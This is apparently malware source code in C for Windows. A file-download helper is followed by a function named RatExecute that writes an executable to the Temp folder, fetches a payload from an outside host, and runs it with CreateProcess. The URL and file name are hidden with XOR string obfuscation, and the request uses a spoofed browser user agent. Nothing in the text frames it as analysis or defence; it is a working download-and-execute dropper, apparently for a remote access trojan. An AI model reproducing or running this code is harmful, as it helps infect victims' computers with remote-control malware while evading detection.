BOOL GetFile (CHAR *szUrl,        // Full URL
	CHAR *szFileName)   // Local file name
{
	HINTERNET hOpen = InternetOpen("Mozilla/5.0 (Windows NT 6.3;)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	DWORD dwSize;
	CHAR   szHead[] = "Accept: */*\r\n\r\n";
	VOID * szTemp[256];
	HINTERNET  hConnect;
	FILE * pFile;

	if ( !(hConnect = InternetOpenUrl ( hOpen, szUrl, szHead,
		lstrlen (szHead), INTERNET_FLAG_DONT_CACHE, 0)))
	{

		return 0;
	}

	if  ( !(pFile = fopen (szFileName, "wb" ) ) )
	{

		return FALSE;
	}
	do
	{
		// Keep coping in 25 bytes chunks, while file has any data left.
		// Note: bigger buffer will greatly improve performance.
		if (!InternetReadFile (hConnect, szTemp, 256,  &dwSize) )
		{
			fclose (pFile);

			return FALSE;
		}
		if (!dwSize)
			break;  // Condition of dwSize=0 indicate EOF. Stop.
		else
			fwrite(szTemp, sizeof (char), dwSize , pFile);
	}   // do
	while (TRUE);
	fflush (pFile);
	fclose (pFile);
	return TRUE;
}
void RatExecute()
{
	char TempPath[512] = {0};
	GetTempPath(512, TempPath);
	lstrcat(TempPath, /*vst.exe*/XorStr<0xC0,8,0xBF0CC10A>("\xB6\xB2\xB6\xED\xA1\xBD\xA3"+0xBF0CC10A).s);
	GetFile(/*http://www.xfiles.co/v5/files/vsengine.txs*/XorStr<0xEE,43,0x42DDCF8D>("\x86\x9B\x84\x81\xC8\xDC\xDB\x82\x81\x80\xD6\x81\x9C\x92\x90\x98\x8D\xD1\x63\x6E\x2D\x75\x31\x2A\x60\x6E\x64\x6C\x79\x24\x7A\x7E\x6B\x61\x77\x78\x7C\x76\x3A\x61\x6E\x64"+0x42DDCF8D).s, TempPath);
	STARTUPINFO info={sizeof(info)};
	PROCESS_INFORMATION processInfo;
	CreateProcess(TempPath, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
}
